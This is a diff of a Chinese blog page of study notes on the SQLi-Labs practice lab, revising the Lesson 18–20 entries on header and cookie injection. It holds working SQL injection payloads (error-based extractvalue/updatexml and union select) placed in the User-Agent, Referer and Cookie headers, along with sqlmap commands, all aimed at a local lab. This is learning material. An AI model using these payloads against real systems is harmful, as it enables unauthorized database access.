@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="风介穹宇">
 <meta property="og:description" content="小知识 1、常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】。2、默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&amp;gt;=2的时候也会检查cookie时面的参数，当&amp;gt;=3的时候将检查User-agen">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-01-09T11:06:47.930Z">
+<meta property="og:updated_time" content="2019-01-15T10:08:51.183Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQLi-Labs学习笔记11~21">
 <meta name="twitter:description" content="小知识 1、常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】。2、默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&amp;gt;=2的时候也会检查cookie时面的参数，当&amp;gt;=3的时候将检查User-agen">
@@ -411,18 +411,18 @@
 </blockquote>
 <p>这里不知道正确的用户名密码，因此无法测试Boolean Based。对于Time Based类型，难点是判定注释的字符，后期可以关于CTF多练练手。</p>
 <hr>
-<h5 id="Lesson-18-20-Header-Cookie-Injection"><a href="#Lesson-18-20-Header-Cookie-Injection" class="headerlink" title="Lesson-18/20 Header/Cookie Injection"></a>Lesson-18/20 Header/Cookie Injection</h5><p>这3个docker环境都没好，贴上其它玩家的剖析。</p>
+<h5 id="Lesson-18-20-Header-Cookie-Injection"><a href="#Lesson-18-20-Header-Cookie-Injection" class="headerlink" title="Lesson-18/20 Header/Cookie Injection"></a>Lesson-18/20 Header/Cookie Injection</h5><p>这里有个前提，只有用正确用户名/密码（可以在Lesson-1中获取）登录才会显示User-Agent等这些字段。</p>
 <p>Lesson-18 User-Agent注入</p>
 <blockquote>
-<p>手注：<br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko/20100101 Firefox/64.0’ and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1<br>SQLMap：<br>python sqlmap.py -u “<a href="http://127.0.0.1/sqli-labs-master/Less-18/&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-18/&quot;</a> –user-agent=”Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0*” –level 4 –dbs –threads 10 –technique BEST –bach</p>
+<p>手注：<br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko/20100101 Firefox/64.0’ and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1<br>SQLMap：<br>python sqlmap.py -r 1.txt –level 3</p>
 </blockquote>
 <p>Lesson-19 Referer注入</p>
 <blockquote>
-<p>手注：<br>Referer: <a href="http://127.0.0.1:8088/&#39;" target="_blank" rel="noopener">http://127.0.0.1:8088/&#39;</a> and updatexml(1,concat(0x7e,(select version()),0x7e),1)1,1)<br>SQLMap：<br>python sqlmap.py -u “<a href="http://127.0.0.1/sqli-labs-master/Less-19/&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-19/&quot;</a> –referer=” <a href="http://127.0.0.1/sqli-labs-master/Less-19/*&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-19/*&quot;</a> –level 4 –dbs –threads 10 –technique BEST –batch</p>
+<p>手注：<br>Referer: <a href="http://127.0.0.1:8088/" target="_blank" rel="noopener">http://127.0.0.1:8088/</a> ‘and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’=’1<br>SQLMap：<br>python sqlmap.py -r 1.txt –level 3</p>
 </blockquote>
 <p>Lesson-20 Cookie注入</p>
 <blockquote>
-<p>手注：<br>Cookie:uname=-1’ union select 1,database(),user() #<br>SQLMap：<br>python sqlmap.py -u “<a href="http://127.0.0.1/sqli-labs-master/Less-20/&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-20/&quot;</a> –level 3</p>
+<p>手注：<br>Cookie:uname=-1’ union select 1,database(),user() #<br>SQLMap：<br>python sqlmap.py -r 1.txt –level 2</p>
 </blockquote>
 
       
